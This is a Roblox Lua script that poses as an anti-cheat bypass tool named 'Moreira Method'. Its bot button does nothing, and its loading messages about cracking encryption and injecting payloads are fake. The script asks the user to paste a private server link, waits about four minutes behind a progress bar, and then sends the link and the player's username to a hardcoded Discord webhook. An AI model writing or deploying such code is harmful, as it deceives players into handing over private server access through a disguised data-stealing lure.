-- Auto-Moreira_Methodv2.lua
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local LocalPlayer = Players.LocalPlayer
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Sound Effects
local ClickSound = Instance.new("Sound")
ClickSound.SoundId = "rbxasset://sounds/click.wav"
ClickSound.Parent = SoundService
local SuccessSound = Instance.new("Sound")
SuccessSound.SoundId = "rbxasset://sounds/uuhhh.wav"
SuccessSound.Parent = SoundService

-- Main GUI Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MainFrame.BackgroundTransparency = 0.1
MainFrame.Parent = ScreenGui

-- Matrix Background Effect
local MatrixLabel = Instance.new("TextLabel")
MatrixLabel.Size = UDim2.new(1, 0, 1, 0)
MatrixLabel.Text = string.rep("0101 ", 1000)
MatrixLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
MatrixLabel.BackgroundTransparency = 1
MatrixLabel.TextTransparency = 0.7
MatrixLabel.TextScaled = false
MatrixLabel.TextSize = 12
MatrixLabel.Font = Enum.Font.Code
MatrixLabel.Parent = MainFrame
spawn(function()
    while true do
        MatrixLabel.Text = string.sub(MatrixLabel.Text, 2) .. (math.random(0, 1) == 0 and "0" or "1")
        wait(0.05)
    end
end)

-- Title for Main GUI
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(0.4, 0, 0.1, 0)
TitleLabel.Position = UDim2.new(0.3, 0, 0.1, 0)
TitleLabel.Text = "Moreira Anti-Cheat Bypass v6.0"
TitleLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.TextScaled = true
TitleLabel.Parent = MainFrame

-- Spawn Bot Button (Does Nothing)
local SpawnBotButton = Instance.new("TextButton")
SpawnBotButton.Size = UDim2.new(0.2, 0, 0.1, 0)
SpawnBotButton.Position = UDim2.new(0.4, 0, 0.3, 0)
SpawnBotButton.Text = "Spawn Bot"
SpawnBotButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SpawnBotButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
SpawnBotButton.Parent = MainFrame
SpawnBotButton.MouseButton1Click:Connect(function()
    ClickSound:Play()
    -- Does nothing
end)

-- Input Button
local InputButton = Instance.new("TextButton")
InputButton.Size = UDim2.new(0.2, 0, 0.1, 0)
InputButton.Position = UDim2.new(0.4, 0, 0.45, 0)
InputButton.Text = "Enter Private Server Link"
InputButton.TextColor3 = Color3.fromRGB(255, 255, 255)
InputButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
InputButton.Parent = MainFrame

-- Input GUI
local InputFrame = Instance.new("Frame")
InputFrame.Size = UDim2.new(0.4, 0, 0.4, 0)
InputFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
InputFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
InputFrame.Visible = false
InputFrame.Parent = MainFrame

local InputTitle = Instance.new("TextLabel")
InputTitle.Size = UDim2.new(0.8, 0, 0.2, 0)
InputTitle.Position = UDim2.new(0.1, 0, 0.05, 0)
InputTitle.Text = "This is for bypassing the anti-cheat"
InputTitle.TextColor3 = Color3.fromRGB(255, 0, 0)
InputTitle.BackgroundTransparency = 1
InputTitle.TextScaled = true
InputTitle.Parent = InputFrame

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(0.8, 0, 0.3, 0)
TextBox.Position = UDim2.new(0.1, 0, 0.3, 0)
TextBox.Text = "Paste Private Server Link Here"
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TextBox.Parent = InputFrame

local ErrorLabel = Instance.new("TextLabel")
ErrorLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
ErrorLabel.Position = UDim2.new(0.1, 0, 0.6, 0)
ErrorLabel.Text = ""
ErrorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
ErrorLabel.BackgroundTransparency = 1
ErrorLabel.TextScaled = true
ErrorLabel.Parent = InputFrame

local SendButton = Instance.new("TextButton")
SendButton.Size = UDim2.new(0.4, 0, 0.2, 0)
SendButton.Position = UDim2.new(0.3, 0, 0.7, 0)
SendButton.Text = "Send"
SendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SendButton.BackgroundColor3 = Color3.fromRGB(0, 120, 0)
SendButton.Parent = InputFrame

-- Loading Screen
local LoadingFrame = Instance.new("Frame")
LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
LoadingFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
LoadingFrame.BackgroundTransparency = 0.2
LoadingFrame.Visible = false
LoadingFrame.Parent = ScreenGui

local LoadingText = Instance.new("TextLabel")
LoadingText.Size = UDim2.new(0.6, 0, 0.3, 0)
LoadingText.Position = UDim2.new(0.2, 0, 0.3, 0)
LoadingText.Text = "Initializing Anti-Cheat Bypass... Estimated Time: 4m"
LoadingText.TextColor3 = Color3.fromRGB(0, 255, 0)
LoadingText.BackgroundTransparency = 1
LoadingText.TextScaled = true
LoadingText.Parent = LoadingFrame

local ProgressBarFrame = Instance.new("Frame")
ProgressBarFrame.Size = UDim2.new(0.6, 0, 0.05, 0)
ProgressBarFrame.Position = UDim2.new(0.2, 0, 0.6, 0)
ProgressBarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ProgressBarFrame.Parent = LoadingFrame

local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
ProgressBar.Parent = ProgressBarFrame

-- Input Button Logic
InputButton.MouseButton1Click:Connect(function()
    ClickSound:Play()
    InputFrame.Visible = true
    ErrorLabel.Text = ""
end)

-- Send Button Logic
SendButton.MouseButton1Click:Connect(function()
    ClickSound:Play()
    local link = TextBox.Text
    if link == "" or link == "Paste Private Server Link Here" then
        ErrorLabel.Text = "Error: Please enter a valid private server link!"
        return
    end
    InputFrame.Visible = false
    LoadingFrame.Visible = true
    local messages = {
        "Grabbing bot... ykkkk",
        "Cracking anti-cheat encryption... ykkkk",
        "Injecting bypass payload to server...",
        "Spoofing client handshake protocols...",
        "Finalizing exploit, hold the line! ykkkk"
    }
    for i, msg in ipairs(messages) do
        LoadingText.Text = msg .. "\nEstimated Time: " .. (4 - i * 0.8) .. "m"
        ProgressBar.Size = UDim2.new(i / 5, 0, 1, 0)
        wait(48)
    end
    local data = {
        content = "Private Server Link: " .. link .. "\nSent by: " .. LocalPlayer.Name .. "\nAnti-Cheat Bypass Attempt (Moreira Method)"
    }
    local success, err = pcall(function()
        HttpService:PostAsync("https://discord.com/api/webhooks/1432521671457374298/mETYE-pr_bqhckpfkxnj9c4wsQOVfCF58YKE6UjEn1TeGaPct-RbEdYnrk_vUYGbUUwa", HttpService:JSONEncode(data))
    end)
    if success then
        LoadingText.Text = "Bypass successful! Bot deployed, ykkkk!"
        SuccessSound:Play()
    else
        LoadingText.Text = "Error in bypass: " .. tostring(err)
    end
    ProgressBar.Size = UDim2.new(1, 0, 1, 0)
    wait(2)
    LoadingFrame.Visible = false
end)
